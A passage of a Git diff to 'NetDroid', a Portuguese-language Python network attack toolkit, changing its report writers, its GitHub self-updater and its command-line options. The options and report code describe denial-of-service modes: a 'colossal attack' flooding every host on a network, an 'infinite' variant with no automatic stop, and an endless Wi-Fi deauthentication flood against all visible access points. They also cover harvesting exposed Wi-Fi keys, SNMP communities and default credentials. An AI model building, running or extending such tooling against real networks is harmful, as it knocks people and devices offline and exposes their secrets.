+            <p class="meta">Boost aplicado em: --discover, --Insane, --god, --godfall.</p>
+            </div>"""
+
+        # ── Card: Kamikase Death Toll ─────────────────────────
+        kamikase_section = ""
+        if self.kamikase.get("ativo"):
+            alvos = self.kamikase.get("alvos", [])
+            por_bssid = self.kamikase.get("pacotes_por_bssid", {})
+            rows = ""
+            for a in alvos:
+                bssid = a.get("bssid", "?")
+                pkts = por_bssid.get(bssid, 0)
+                rows += (
+                    f"<tr><td>{html.escape(str(a.get('essid', '?')))[:30]}</td>"
+                    f"<td>{html.escape(bssid)}</td>"
+                    f"<td>{a.get('canal', '?')}</td>"
+                    f"<td>{a.get('rssi', '?')}</td>"
+                    f"<td>{pkts:,}</td></tr>"
+                )
+            duracao = self.kamikase.get("duracao_s", 0)
+            total = self.kamikase.get("total_pacotes", 0)
+            pps_medio = int(total / duracao) if duracao > 0 else 0
+            kamikase_section = f"""<div class="card"><h2>⚡ Kamikase Death Toll ⚡</h2>
+            <p class="meta">Total: <strong>{total:,}</strong> pacotes |
+            Duração: <strong>{duracao:.1f}s</strong> |
+            PPS médio: <strong>{pps_medio:,}</strong> |
+            BSSIDs atacados: <strong>{len(alvos)}</strong> |
+            Motivo do encerramento: {html.escape(self.kamikase.get('motivo_encerramento', 'n/a'))}</p>
+            <p class="meta">Audit log: <code>{html.escape(self.kamikase.get('audit_log', '?'))}</code></p>
+            <div class="didatica-wrap">{self._explicacao_html("kamikase")}</div>
+            <div class="table-wrap"><table>
+            <tr><th>ESSID</th><th>BSSID</th><th>Canal</th><th>RSSI</th><th>Pacotes</th></tr>
+            {rows}</table></div></div>"""
 
         topo_svg = self._generate_topology_svg()
-
         content = f"""<!DOCTYPE html><html lang="pt-BR"><head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>NetDroid Report — {html.escape(self.det.ssid or 'Scan')}</title>
+<title>NetDroid Report - {html.escape(self.det.ssid or 'Scan')}</title>
 <style>
-*{{margin:0;padding:0;box-sizing:border-box}}
-body{{background:#0a0a0a;color:#fff;font-family:'Courier New',monospace;padding:20px}}
-h1{{color:#cc0000;text-align:center;font-size:2em;margin:20px 0;text-shadow:0 0 10px #cc000066}}
-h2{{color:#cc0000;margin:15px 0 10px;border-bottom:1px solid #cc000044;padding-bottom:5px}}
-.card{{background:#111;border:1px solid #cc0000;border-radius:8px;padding:20px;margin:15px 0;
-       box-shadow:0 0 15px #cc000022}}
-.cred-card{{border-color:#ff0000;box-shadow:0 0 20px #ff000044}}
-table{{width:100%;border-collapse:collapse;margin:10px 0}}
-th{{background:#1a0000;color:#cc0000;padding:8px;text-align:left;border-bottom:2px solid #cc0000}}
-td{{padding:6px 8px;border-bottom:1px solid #222}}
-tr:hover{{background:#1a1a1a}}
-.meta{{color:#555;text-align:center;margin:10px 0;font-size:0.85em}}
-.stat{{display:inline-block;background:#1a0000;border:1px solid #cc000044;
-       border-radius:4px;padding:8px 15px;margin:5px;text-align:center}}
-.stat .val{{font-size:1.5em;color:#00ff41;font-weight:bold}}
-.stat .lbl{{font-size:0.75em;color:#888}}
-.topo{{text-align:center;margin:20px 0}}
-</style></head><body>
-<h1>⟨ NetDroid Report ⟩</h1>
-<p class="meta">SSID: {html.escape(self.det.ssid or 'N/A')} |
-Gateway: {html.escape(self.det.gateway or 'N/A')} |
-Subnet: {html.escape(self.det.subnet or 'N/A')} |
-{self.timestamp.strftime('%Y-%m-%d %H:%M')}</p>
-<div style="text-align:center">
+*{{margin:0;padding:0;box-sizing:border-box}} body{{background:#0a0a0a;color:#fff;font-family:'Courier New',monospace}}
+.wrap{{max-width:1200px;margin:0 auto;padding:16px}} h1{{color:#cc0000;text-align:center;font-size:clamp(1.4rem,2.5vw,2rem);margin:12px 0 18px}}
+h2{{color:#cc0000;margin:10px 0 12px;font-size:clamp(1rem,2vw,1.2rem)}} .meta{{color:#999;text-align:center;font-size:.86rem;margin:8px 0 12px}}
+.stats{{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin:10px 0 14px}}
+.stat{{background:#121212;border:1px solid #2b2b2b;border-radius:8px;padding:10px;text-align:center}} .val{{font-size:1.45rem;color:#00ff9f;font-weight:700}}
+.lbl{{font-size:.75rem;color:#a6a6a6}} .card{{background:#111;border:1px solid #2a2a2a;border-radius:8px;padding:14px;margin:12px 0}}
+.topo{{text-align:center;margin:12px 0 6px}} .table-wrap{{overflow:auto;max-width:100%}} table{{width:100%;border-collapse:collapse;min-width:980px}}
+th{{background:#1a0000;color:#cc0000;padding:8px;text-align:left;border-bottom:2px solid #cc0000}} td{{padding:7px 8px;border-bottom:1px solid #242424;vertical-align:top}}
+tr:hover{{background:#171717}}
+.badge{{display:inline-block;padding:2px 7px;border-radius:10px;font-size:.72rem;background:#222;color:#ddd;border:1px solid #333}}
+.badge.tipo-roteador{{background:#06223e;color:#5fbcff;border-color:#0e4f8e}}
+.badge.tipo-camera_ip{{background:#3e0606;color:#ff6c6c;border-color:#8e0e0e}}
+.badge.tipo-impressora{{background:#3a3a06;color:#ffe05e;border-color:#7e7e0e}}
+.badge.tipo-windows_pc{{background:#1c2a3a;color:#9ad0ff;border-color:#3a5a82}}
+.badge.tipo-linux_servidor{{background:#063e1a;color:#5fff9f;border-color:#0e8e3a}}
+.badge.tipo-mobile{{background:#3a063e;color:#ff9af0;border-color:#7e0e8e}}
+.badge.tipo-iot_generico{{background:#3e2a06;color:#ffb35e;border-color:#8e5e0e}}
+.badge.tipo-nas{{background:#063e3a;color:#5fffe0;border-color:#0e8e7e}}
+.badge.tipo-voip{{background:#2a063e;color:#c89aff;border-color:#5e0e8e}}
+.badge.tipo-desconhecido{{background:#222;color:#888}}
+.badge.sev-critica{{background:#3e0606;color:#ff4d4d;border-color:#cc0000}}
+.badge.sev-alta{{background:#3a1c06;color:#ff9d4d;border-color:#a35200}}
+.badge.sev-media{{background:#3a3206;color:#ffe05e;border-color:#a37700}}
+.badge.sev-info{{background:#06283e;color:#5fbcff;border-color:#0e4f8e}}
+tr.sev-critica td:first-child{{border-left:3px solid #cc0000}}
+tr.sev-alta td:first-child{{border-left:3px solid #cc7000}}
+.didatica-wrap{{margin:8px 0 14px;padding:10px 12px;background:#0c1418;border-left:3px solid #00d4ff;border-radius:6px}}
+.didatica-intro{{color:#9ad0ff;font-size:.86rem;margin:4px 0 8px;line-height:1.45}}
+.didatica-intro em{{color:#fdee00;font-style:normal}}
+details.didatica{{margin:6px 0;padding:6px 10px;background:#101820;border:1px solid #1f2e3a;border-radius:5px;cursor:pointer}}
+details.didatica summary{{color:#00d4ff;font-weight:600;font-size:.84rem;list-style:none;outline:none}}
+details.didatica summary::-webkit-details-marker{{display:none}}
+details.didatica summary::before{{content:"▶ ";color:#bc13fe;font-size:.7rem}}
+details.didatica[open] summary::before{{content:"▼ "}}
+details.didatica p{{margin:6px 0;color:#cfd8dc;font-size:.82rem;line-height:1.5}}
+details.didatica strong{{color:#00ff9f}}
+details.didatica code{{background:#000;color:#fdee00;padding:2px 6px;border-radius:3px;font-size:.78rem}}
+@media (max-width:700px){{.wrap{{padding:10px}} .card{{padding:10px}} table{{min-width:780px}}}}
+</style></head><body><div class="wrap">
+<h1>NetDroid Report</h1>
+<p class="meta">SSID: {html.escape(self.det.ssid or 'N/A')} | Gateway: {html.escape(self.det.gateway or 'N/A')} | Subnet: {html.escape(self.det.subnet or 'N/A')} | {self.timestamp.strftime('%Y-%m-%d %H:%M')}</p>
+<div class="stats">
 <div class="stat"><div class="val">{len(self.hosts)}</div><div class="lbl">Hosts</div></div>
-<div class="stat"><div class="val">{sum(len(h.get('ports',[])) for h in self.hosts)}</div>
-<div class="lbl">Open Ports</div></div>
-<div class="stat"><div class="val">{len(creds)}</div><div class="lbl">Creds Found</div></div>
+<div class="stat"><div class="val">{open_ports}</div><div class="lbl">Portas Abertas</div></div>
+<div class="stat"><div class="val">{total_vulns}</div><div class="lbl">Vulnerabilidades</div></div>
+<div class="stat"><div class="val">{total_leaks}</div><div class="lbl">Segredos</div></div>
+<div class="stat"><div class="val">{total_psks}</div><div class="lbl">PSKs</div></div>
+<div class="stat"><div class="val">{len(risks)}</div><div class="lbl">Riscos</div></div>
 </div>
 <div class="topo">{topo_svg}</div>
-<div class="card"><h2>Hosts Descobertos</h2>
-<table><tr><th>IP</th><th>MAC</th><th>Vendor</th><th>OS</th><th>Ports</th>
-<th>Services</th><th>Web</th></tr>{hosts_rows}</table></div>
-{creds_section}{lat_section}
-<p class="meta">NetDroid v{VERSION} — Gerado automaticamente</p>
-</body></html>"""
+<div class="card"><h2>Inventário de Hosts (Inteligência Total)</h2>
+<div class="didatica-wrap">{self._explicacao_html("inventario_hosts")}</div>
+<div class="table-wrap"><table><tr><th>IP</th><th>Hostname</th><th>Tipo</th><th>MAC</th><th>Vendor</th><th>OS</th><th>Portas</th><th>Serviços</th><th>Web</th><th>Conf.</th><th>Risk</th><th>Fontes</th></tr>{hosts_rows}</table></div></div>
+{privilege_section}{vuln_section}{cred_section}{risk_section}{godfall_section}{kamikase_section}{lat_section}
+<p class="meta">NetDroid v{VERSION} — gerado automaticamente</p>
+</div></body></html>"""
         path.write_text(content, encoding="utf-8")
 
     def _generate_topology_svg(self) -> str:
@@ -1810,46 +7969,236 @@ Subnet: {html.escape(self.det.subnet or 'N/A')} |
                 f'{"".join(nodes)}{gw_node}</svg>')
 
     def _write_txt(self, path: Path):
+        risks = self.god.get("risks", [])
+        risk_map = {r["ip"]: r for r in risks}
+        godfall = self.stress.get("godfall", {})
+        total_vulns = sum(len(h.get("vulns", []) or []) for h in self.hosts)
         lines = [
-            f"{'=' * 60}",
-            f"  NetDroid — Resumo Executivo",
+            f"{'=' * 64}",
+            f"  NetDroid v{VERSION} — Resumo Executivo",
             f"  {self.timestamp.strftime('%Y-%m-%d %H:%M')}",
-            f"{'=' * 60}",
+            f"{'=' * 64}",
             f"  SSID:    {self.det.ssid or 'N/A'}",
             f"  Gateway: {self.det.gateway or 'N/A'}",
             f"  Subnet:  {self.det.subnet or 'N/A'}",
             f"  Hosts:   {len(self.hosts)}",
-            f"{'─' * 60}",
+            f"  Vulns:   {total_vulns}",
+            f"  Riscos:  {len(risks)}",
+            f"{'-' * 64}",
         ]
         for h in self.hosts:
             gw = " [GATEWAY]" if h.get("is_gateway") else ""
             ports = ", ".join(str(p) for p in h.get("ports", [])[:10])
+            hostname = h.get("hostname", "") or "—"
+            tipo = h.get("device_type", "desconhecido")
+            fontes = ", ".join(h.get("fontes", [])) or "—"
             lines.append(f"  {h['ip']}{gw}")
+            lines.append(f"    Hostname: {hostname}  |  Tipo: {tipo}")
             lines.append(f"    MAC: {h.get('mac', 'N/A')} | {h.get('vendor', '?')} | {h.get('os', '?')}")
+            lines.append(f"    Fontes: {fontes}")
             if ports:
-                lines.append(f"    Ports: {ports}")
+                lines.append(f"    Portas: {ports}")
             for w in h.get("web_info", []):
                 lines.append(f"    Web: {w.get('title', '')} [{w.get('server', '')}]")
-        creds = self.god.get("creds", [])
-        if creds:
-            lines.append(f"\n{'!' * 60}")
-            lines.append(f"  CREDENCIAIS ENCONTRADAS:")
-            for c in creds:
-                lines.append(f"  {c['ip']}:{c['port']} — {c['user']}:{c['password']} ({c.get('vendor','')})")
-            lines.append(f"{'!' * 60}")
-        lines.append(f"\n{'=' * 60}")
-        lines.append(f"  NetDroid v{VERSION}")
-        lines.append(f"{'=' * 60}")
+            for v in (h.get("vulns", []) or [])[:5]:
+                lines.append(f"    Vuln [{v.get('severidade', 'info').upper()}] "
+                             f"porta {v.get('porta', '?')}: {v.get('dica_cve', '')[:90]}")
+            for leak in (h.get("secret_leaks", []) or [])[:3]:
+                tipos = ", ".join(a["tipo"] for a in leak.get("achados", []))
+                lines.append(f"    LEAK {leak.get('path', '?')} → {tipos}")
+            for psk in (h.get("psk_leaks", []) or [])[:2]:
+                p = psk.get("psk", "")
+                masc = (p[:3] + "*" * max(0, len(p) - 5) + p[-2:]) if len(p) > 5 else "*****"
+                lines.append(f"    PSK exposta porta {psk.get('port', '?')}: {masc}")
+            for snmp in (h.get("snmp_creds", []) or [])[:2]:
+                lines.append(f"    SNMP community '{snmp.get('community', '')}' aceita")
+            risk = risk_map.get(h["ip"])
+            if risk:
+                lines.append(f"    Risk: {risk.get('score', 0)} ({risk.get('severity', 'low')})")
+                lines.append(f"    Issues: {'; '.join(risk.get('issues', [])[:3])}")
+
+        if total_vulns:
+            lines.append(f"\n{'-' * 64}")
+            lines.append("  === VULNERABILIDADES ===")
+            lines.append("  📖 Como ler: cada linha é um INDÍCIO detectado por banner/")
+            lines.append("     regex. Severidade vai de [INFO] a [CRITICA]. Veja o glossário")
+            lines.append("     no final do arquivo para entender o impacto de cada nível.")
+            lines.append("")
+            for h in self.hosts:
+                for v in (h.get("vulns", []) or [])[:10]:
+                    lines.append(f"  - {h['ip']}:{v.get('porta', '?')} "
+                                 f"[{v.get('severidade', 'info').upper()}] "
+                                 f"{v.get('dica_cve', '')[:90]}")
+
+        # ── Credential & Secret Hunting ──────────────────────
+        leaks_total = sum(len(h.get("secret_leaks", []) or []) for h in self.hosts)
+        psks_total = sum(len(h.get("psk_leaks", []) or []) for h in self.hosts)
+        snmp_total = sum(len(h.get("snmp_creds", []) or []) for h in self.hosts)
+        sug_total = sum(len(h.get("creds_padrao_sugeridas", []) or []) for h in self.hosts)
+        if leaks_total or psks_total or snmp_total or sug_total:
+            lines.append(f"\n{'-' * 64}")
+            lines.append("  === CREDENTIAL & SECRET HUNTING (passivo) ===")
+            lines.append("  📖 Como ler: 100% passivo — apenas lemos o que o servidor")
+            lines.append("     entrega publicamente. NÃO houve tentativa de login. Cada")
+            lines.append("     subtipo abaixo está explicado em detalhes no GLOSSÁRIO.")
+            lines.append("")
+            lines.append(f"  Segredos: {leaks_total} | PSKs: {psks_total} | "
+                         f"SNMP communities: {snmp_total} | Sugestões de creds: {sug_total}")
+            if leaks_total:
+                lines.append(f"\n  -- Vazamentos confirmados --")
+                for h in self.hosts:
+                    for leak in (h.get("secret_leaks", []) or []):
+                        tipos = ", ".join(a["tipo"] for a in leak.get("achados", []))
+                        lines.append(f"  ! {h['ip']}{leak['path']} ({leak.get('status', '?')}) "
+                                     f"→ {tipos}")
+            if psks_total:
+                lines.append(f"\n  -- PSKs WiFi expostas --")
+                for h in self.hosts:
+                    for psk in (h.get("psk_leaks", []) or []):
+                        p = psk.get("psk", "")
+                        masc = (p[:3] + "*" * max(0, len(p) - 5) + p[-2:]) if len(p) > 5 else "*****"
+                        lines.append(f"  ! {h['ip']}:{psk.get('port', '?')} "
+                                     f"[{psk.get('tipo', '')}] → {masc} (len={len(p)})")
+            if snmp_total:
+                lines.append(f"\n  -- SNMP communities aceitas --")
+                for h in self.hosts:
+                    for snmp in (h.get("snmp_creds", []) or []):
+                        lines.append(f"  - {h['ip']} | community={snmp.get('community', '')} | "
+                                     f"{snmp.get('sys_descr', '')[:60]}")
+            if sug_total:
+                lines.append(f"\n  -- Credenciais padrão prováveis (informativo) --")
+                for h in self.hosts:
+                    for sug in (h.get("creds_padrao_sugeridas", []) or []):
+                        amostras = ", ".join(sug.get("pares", [])[:4])
+                        lines.append(f"  - {h['ip']} ({sug.get('vendor_detectado', '?')} "
+                                     f"via {sug.get('fonte', '?')}): {amostras}")
+
+        if risks:
+            lines.append(f"\n{'-' * 64}")
+            lines.append("  === TOP RISCOS ===")
+            lines.append("  📖 Como ler: score 0–100 por host (soma dos achados).")
+            lines.append("     low (<30) | medium (30–59) | high (60+). O glossário no")
+            lines.append("     final explica cada tipo de issue listada.")
+            lines.append("")
+            for r in risks[:20]:
+                lines.append(f"  - {r['ip']} | score={r['score']} | {r['severity']} | "
+                             f"{'; '.join(r.get('issues', [])[:2])}")
+
+        if godfall:
+            lines.append(f"\n{'-' * 64}")
+            lines.append(f"  === GODFALL TITAN SWEEP ({godfall.get('modo', 'fases')}) ===")
+            lines.append("  📖 Como ler: benchmark de resiliência em 4 fases progressivas.")
+            lines.append("     Cada fase aumenta a carga e dispara uma 'barragem' UDP+TCP")
+            lines.append("     em paralelo. Veja explicação completa no GLOSSÁRIO.")
+            lines.append("")
+            if godfall.get("aborted"):
+                lines.append("  Status: ABORTADO")
+                lines.append(f"  Motivo: {godfall.get('abort_reason', '')}")
+            else:
+                lines.append("  Status: CONCLUÍDO")
+            rec = godfall.get("recovery", {}) or {}
+            lines.append(f"  Recovery: {'sim' if rec.get('recovered') else 'não'} ({rec.get('seconds', 0)}s)")
+            lines.append(f"  Barrage total: {godfall.get('barrage_packets_total', 0):,} pacotes UDP")
+            iperf = godfall.get("baseline_iperf", {}) or {}
+            if iperf:
+                tcp = iperf.get("tcp", {}) or {}
+                udp = iperf.get("udp", {}) or {}
+                tcp_mbps = (tcp.get("sum_sent", {}).get("bits_per_second", 0) or 0) / 1e6
+                udp_mbps = (udp.get("sum", {}).get("bits_per_second", 0) or 0) / 1e6
+                lines.append(f"  Baseline iperf3: TCP {tcp_mbps:.1f} Mbps | UDP {udp_mbps:.1f} Mbps")
+            for p in godfall.get("phases", []):
+                lines.append(
+                    f"  Fase {p['name']}: tent./host={p['attempts_per_host']} | "
+                    f"conc={p['concurrency']} | delay={p['delay_ms']}ms | "
+                    f"lat_snap={p['latency_snapshot_ms']}ms | sucesso={p.get('success_rate_pct', 0)}% | "
+                    f"barrage tier {p.get('barrage_tier', 0)} ({p.get('barrage_packets', 0):,} pkts)"
+                )
+            lines.append(f"\n{'-' * 64}")
+            lines.append("  === RANKING DE RESILIÊNCIA ===")
+            lines.append(f"  Hosts testados: {godfall.get('hosts_tested', 0)}")
+            lines.append(f"  Tentativas/host base: {godfall.get('attempts_per_host', 0)}")
+            lines.append(f"  Sucesso médio: {godfall.get('avg_success_rate', 0)}%")
+            for h in godfall.get("per_host", [])[:20]:
+                lines.append(f"  - {h['ip']} | sucesso={h['success_rate']}% | req/s={h['avg_rps']}")
+
+        # ── GLOSSÁRIO E IMPACTO ────────────────────────────────
+        # ── Privilege Mode (TXT) ─────────────────────────────
+        if self.ctx_priv and self.ctx_priv.ativo:
+            lines.append(f"\n{'-' * 64}")
+            lines.append(f"  === PRIVILEGE MODE — {self.ctx_priv.motor.upper()} ===")
+            lines.append(f"  Plataforma: {self.ctx_priv.plataforma} | "
+                         f"Motor: {self.ctx_priv.motor}")
+            lines.append(f"  Capabilities ({len(self.ctx_priv.capabilities)}): "
+                         f"{', '.join(sorted(self.ctx_priv.capabilities))}")
+            lines.append("  📖 Boost aplicado em todas as flags. Veja glossário 'privilegio_root'.")
+
+        # ── Kamikase Death Toll (TXT) ────────────────────────
+        if self.kamikase.get("ativo"):
+            lines.append(f"\n{'-' * 64}")
+            lines.append("  === ⚡ KAMIKASE DEATH TOLL ⚡ ===")
+            lines.append("  📖 Deauth flood 802.11 — veja glossário 'kamikase'.")
+            lines.append("")
+            lines.append(f"  Total: {self.kamikase.get('total_pacotes', 0):,} pacotes")
+            lines.append(f"  Duração: {self.kamikase.get('duracao_s', 0):.1f}s")
+            lines.append(f"  BSSIDs atacados: {len(self.kamikase.get('alvos', []))}")
+            lines.append(f"  Motivo encerramento: {self.kamikase.get('motivo_encerramento', 'n/a')}")
+            lines.append(f"  Audit log: {self.kamikase.get('audit_log', '?')}")
+            lines.append("")
+            for a in self.kamikase.get("alvos", []):
+                bssid = a.get("bssid", "?")
+                pkts = self.kamikase.get("pacotes_por_bssid", {}).get(bssid, 0)
+                lines.append(f"  - {bssid} | {a.get('essid', '?')[:30]:30s} | "
+                             f"canal {a.get('canal', '?')} | {pkts:,} pacotes")
+
+        chaves = self._coletar_chaves_explicacao()
+        if chaves:
+            lines.append(f"\n{'=' * 64}")
+            lines.append("  === GLOSSÁRIO E IMPACTO DOS ACHADOS ===")
+            lines.append(f"{'=' * 64}")
+            lines.append("  Esta seção explica em detalhes cada TIPO de descoberta")
+            lines.append("  que apareceu nesta varredura. Use como referência rápida")
+            lines.append("  para entender o que cada achado significa, como confirmar")
+            lines.append("  manualmente que é real, e qual o impacto na prática.")
+            lines.append("")
+            for chave in chaves:
+                bloco = self._explicacao_txt(chave, indent="  ")
+                if bloco:
+                    lines.extend(bloco)
+                    lines.append("")
+
+        lines.append(f"\n{'=' * 64}")
+        lines.append(f"  NetDroid v{VERSION} — gerado automaticamente")
+        lines.append(f"{'=' * 64}")
         path.write_text("\n".join(lines), encoding="utf-8")
 
 
 # ═══════════════════ UPGRADER ═════════════════════════════════
 
 class Upgrader:
-    """Auto-update from GitHub."""
+    """Auto-update via GitHub (yamotoz/NetDroid) com retry e validação."""
 
     def __init__(self, ui: TerminalUI):
         self.ui = ui
+
+    # Busca uma URL com até 3 tentativas e backoff curto
+    def _fetch(self, url: str, timeout: int = 20, tentativas: int = 3) -> Optional[str]:
+        if not HAS_REQUESTS:
+            return None
+        ua = {"User-Agent": f"NetDroid/{VERSION}"}
+        ultimo_erro = ""
+        for n in range(1, tentativas + 1):
+            try:
+                resp = requests.get(url, timeout=timeout, headers=ua)
+                if resp.status_code == 200:
+                    return resp.text
+                ultimo_erro = f"HTTP {resp.status_code}"
+            except Exception as e:
+                ultimo_erro = str(e)
+            if n < tentativas:
+                self.ui.warn(f"  Tentativa {n}/{tentativas} falhou ({ultimo_erro}). Retentando...")
+                time.sleep(1.5 * n)
+        self.ui.error(f"Falha após {tentativas} tentativas: {ultimo_erro}")
+        return None
 
     def run(self):
         self.ui.section("AUTO-UPDATE")
@@ -1857,29 +8206,42 @@ class Upgrader:
             self.ui.error("requests não instalado. pip install requests")
             return
         try:
-            self.ui.info(f"Verificando versão remota...")
-            resp = requests.get(GITHUB_VERSION_URL, timeout=10)
-            if resp.status_code != 200:
-                self.ui.error(f"Falha ao buscar versão: HTTP {resp.status_code}")
-                return
-            remote_version = resp.text.strip()
+            self.ui.info("Verificando versão remota em github.com/yamotoz/NetDroid...")
+            version_text = self._fetch(GITHUB_VERSION_URL, timeout=10)
+            if version_text is None:
+                self.ui.warn("Sem arquivo VERSION remoto — comparando por hash do script.")
+                remote_version = "?"
+            else:
+                remote_version = version_text.strip().splitlines()[0] if version_text.strip() else "?"
             self.ui.info(f"Local: {VERSION} | Remota: {remote_version}")
-            if remote_version == VERSION:
+            if remote_version != "?" and remote_version == VERSION:
                 self.ui.success("Já está na versão mais recente.")
                 return
             if not self.ui.consent(f"Atualizar {VERSION} → {remote_version}?"):
                 return
+
             self.ui.info("Baixando nova versão...")
-            resp = requests.get(GITHUB_RAW_URL, timeout=30)
-            if resp.status_code != 200:
-                self.ui.error(f"Falha no download: HTTP {resp.status_code}")
+            novo_codigo = self._fetch(GITHUB_RAW_URL, timeout=30)
+            if novo_codigo is None:
+                self.ui.error("Download abortado.")
                 return
+
+            # Validações de segurança antes de sobrescrever
+            tamanho = len(novo_codigo.encode("utf-8", errors="ignore"))
+            if tamanho < 10_000:
+                self.ui.error(f"Arquivo remoto muito pequeno ({tamanho} bytes). Abortando.")
+                return
+            if "NetDroid" not in novo_codigo or "def main_async" not in novo_codigo:
+                self.ui.error("Conteúdo remoto não parece ser o NetDroid. Abortando.")
+                return
+
             script_path = Path(__file__).resolve()
             backup = script_path.with_suffix(".py.bak")
             shutil.copy2(script_path, backup)
-            self.ui.success(f"Backup: {backup}")
-            script_path.write_text(resp.text, encoding="utf-8")
-            self.ui.success(f"Atualizado para v{remote_version}")
+            self.ui.success(f"Backup salvo em: {backup}")
+            script_path.write_text(novo_codigo, encoding="utf-8")
+            self.ui.success(f"Atualizado para v{remote_version} ({tamanho:,} bytes).")
+            self.ui.info("Rode novamente para usar a nova versão.")
         except Exception as e:
             self.ui.error(f"Erro no update: {e}")
 
@@ -1889,63 +8251,67 @@ class Upgrader:
 def build_parser() -> argparse.ArgumentParser:
     p = argparse.ArgumentParser(
         prog="NetDroid",
-        description="Professional WiFi Network Analysis Toolkit",
+        description="NetDroid — Análise profissional de redes WiFi (Termux/Linux/Windows)",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog=textwrap.dedent("""\
-            Exemplos:
-              python NetDroid.py --auto --discover
-              python NetDroid.py --auto --discover --normal
-              python NetDroid.py --auto --discover --Insane
-              python NetDroid.py --t 192.168.1.5 --Insane
-              python NetDroid.py --auto --discover --god
-              python NetDroid.py --upgrade
+            CLI minimalista — três modos de operação:
+
+              python NetDroid.py --auto --god                       (reconhecimento total)
+              python NetDroid.py --auto --godfall                   (ataque colossal à rede)
+              python NetDroid.py --auto --godfall --infinite        (ataque sem freios até Ctrl+C)
+              python NetDroid.py --root --kamikase                  (deauth WiFi — exige Kali)
+
+              python NetDroid.py --root --auto --god                (boost apex militar)
+              python NetDroid.py --t 192.168.1.5 --god              (alvo manual)
+              python NetDroid.py --upgrade                          (auto-update)
         """))
 
-    # Target
+    # Alvo
     p.add_argument("--auto", action="store_true",
-                   help="Auto-detect gateway/subnet")
+                   help="Auto-detecta gateway/subnet/SSID")
     p.add_argument("--t", metavar="TARGET",
-                   help="Manual target IP or subnet (e.g. 192.168.1.5 or 192.168.0.0/24)")
+                   help="Alvo manual: IP único ou subnet CIDR (ex.: 192.168.1.5 ou 192.168.0.0/24)")
 
-    # Discovery
-    p.add_argument("--discover", action="store_true",
-                   help="Run full host discovery")
-
-    # Scan modes
-    p.add_argument("--normal", action="store_true",
-                   help="Port scan top 20 ports (balanced)")
-    p.add_argument("--Insane", action="store_true",
-                   help="Port scan 1-65535 (max speed)")
-    p.add_argument("--stealth", action="store_true",
-                   help="Port scan top 100 (stealthy, random delays)")
-    p.add_argument("--ports", metavar="PORTS",
-                   help="Custom ports (comma-separated, e.g. 80,443,8080)")
-
-    # Stress
-    p.add_argument("--overfull", action="store_true",
-                   help="Heavy stress test (TCP flood + UDP storm + HTTP storm)")
-    p.add_argument("--overflow", action="store_true",
-                   help="Professional stress with iperf3 metrics")
-    p.add_argument("--flood", action="store_true",
-                   help="High level DOS attack to the router (infinite packets)")
-
-    # God mode & Advanced Attacks
+    # ─── 3 MODOS DE OPERAÇÃO ──────────────────────────────────
     p.add_argument("--god", action="store_true",
-                   help="Full network interaction (broadcast + NetBIOS + HTTP deep probe)")
-    p.add_argument("--slowloris", action="store_true",
-                   help="[GOD] HTTP Slowloris attack (Esgota conexões web de IoT)")
-    p.add_argument("--rtsp-kill", action="store_true",
-                   help="[GOD] RTSP Connection exhaustion (Trava câmeras IP)")
-    p.add_argument("--onvif", action="store_true",
-                   help="[GOD] ONVIF WS-Discovery (Detecta câmeras IP em multicast)")
-    p.add_argument("--mirai", action="store_true",
-                   help="[GOD] Mirai botnet brute-force (Telnet/SSH senhas padrão)")
+                   help="MODO RECONHECIMENTO: descoberta total de hosts (ARP + ping + TCP probe + "
+                        "mDNS + NetBIOS + SSDP + SMB + HTTP + DHCP + nmap) + scan completo "
+                        "1-65535 portas com avaliação de vulnerabilidades + auditoria defensiva "
+                        "(SNMP/NTP/DNS amplificação, fingerprints 50+, paths default, ONVIF) + "
+                        "risk scoring + relatório HTML/TXT didático.")
 
-    # Utility
+    p.add_argument("--godfall", action="store_true",
+                   help="MODO ATAQUE: stress colossal a TODOS os hosts da rede (roteador, celular, "
+                        "TV, IoT, etc.). 2 fases progressivas (OVERDRIVE→TITANFALL) com barragem "
+                        "UDP/TCP multi-thread + HTTP storm + baseline iperf3. Sob --root: "
+                        "SYN flood spoofed via scapy adicional.")
+    p.add_argument("--infinite", action="store_true",
+                   help="Combinado com --godfall: TITANFALL roda eternamente até Ctrl+C, sem "
+                        "freios automáticos. Mostra '🚨 REDE CAIU' quando degrada mas continua.")
+
+    p.add_argument("--kamikase", action="store_true",
+                   help="MODO DEAUTH WIFI: flood 802.11 infinito em todos os APs visíveis. "
+                        "EXIGE --root + autorização explícita. Funciona pleno em Kali Linux; "
+                        "Windows depende do driver da placa. USO LEGAL APENAS.")
+
+    p.add_argument("--live", action="store_true",
+                   help="DASHBOARD C2 EM TEMPO REAL: abre um painel web local elegante "
+                        "(http://127.0.0.1:5556) com WebSocket, animações e atualização ao vivo. "
+                        "Combinado com --god: mapeia hosts, vulnerabilidades, gráficos. "
+                        "Combinado com --kamikase: 3 zonas (verde=APs vivos / vermelha=deauth / "
+                        "azul=crack hashcat) com drag-and-drop entre elas. Foco Kali Linux.")
+
+    # ─── BOOSTER ──────────────────────────────────────────────
+    p.add_argument("--root", action="store_true",
+                   help="Booster APEX: auto-detecta SO (Windows Admin / Linux root / Termux su) "
+                        "e amplifica os 3 modos com raw sockets, scapy, binários nativos "
+                        "(aireplay-ng, mdk4, tcpdump) e telemetria de kernel.")
+
+    # Utilidades
     p.add_argument("--upgrade", action="store_true",
-                   help="Auto-update from GitHub")
+                   help="Auto-update via github.com/yamotoz/NetDroid (com retry e validação)")
     p.add_argument("--version", action="store_true",
-                   help="Show version")
+                   help="Mostra a versão atual")
 
     return p
 
@@ -1964,112 +8330,189 @@ async def main_async(args):
         Upgrader(ui).run()
         return
 
-    # ── validate target ───────────────────────
-    if not args.auto and not args.t:
-        ui.error("Use --auto ou --t <target> para definir o alvo.")
-        ui.info("Exemplo: python NetDroid.py --auto --discover")
+    # ── kamikase requer --root ────────────────
+    if args.kamikase and not args.root:
+        ui.error("--kamikase requer --root. Não há ataque 802.11 sem privilégio.")
+        ui.info("Exemplo: sudo python NetDroid.py --root --kamikase")
         return
 
-    has_action = any([args.discover, args.normal, args.Insane, args.stealth,
-                      args.ports, args.overfull, args.overflow, args.god,
-                      args.flood, args.slowloris, args.rtsp_kill,
-                      args.onvif, args.mirai])
+    has_action = any([args.god, args.godfall, args.kamikase])
     if not has_action:
         ui.error("Nenhuma ação especificada.")
-        ui.info("Use: --discover, --normal, --Insane, --stealth, --overfull, --overflow, --god")
